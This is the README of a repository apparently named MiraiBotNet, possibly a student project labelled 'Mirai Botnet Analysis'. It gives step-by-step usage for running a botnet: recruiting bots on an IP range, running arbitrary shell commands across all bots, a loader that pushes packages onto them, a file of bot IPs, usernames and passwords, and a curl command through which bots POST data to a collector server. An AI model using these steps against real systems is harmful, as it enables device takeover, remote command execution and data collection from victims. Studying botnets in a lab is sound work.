# MiraiBotNet

## prerequisites

 - mongoDB 
 - pip

```bash
# chmod +x init.sh
# ./init.sh
# cd botnet/
# pip install -r requirement.txt  
```
## Usage 

### To get the bots
```bash
# cd botnet/
# ./run.sh <ip> 
  eg:- # ./run.sh 192.168.31.X 
```

### To run the command accross all the bots
```bash
# cd botnet/
# ./command.sh <cmd> 
  eg:- # ./command.sh "ls;ping www.google.com"
```
## Loader

### To add a package:
```bash
# cd loader/getDependencies
```
#####  Add the package name to packages.txt
##### Run : 
```bash
# python3 getter.py
```
##### Dependencies will be added to neededDependencies.txt

### To start loader:
```bash
# cd loader/install
# python3 installer.py &
```
##### Logs will be present at logs/loader.log

## Information
### userPassIPFile.txt file contains the IP,Username,Password of the bots. 
 
### to get data from bots
```
curl --header "Content-Type: application/json" --request POST --data '{"ip":"192.168.31.254","data":"this is data entered bla"}' http://192.168.31.32:5000/receiveData
```


PW20RJS01 - Mirai Botnet Analysis
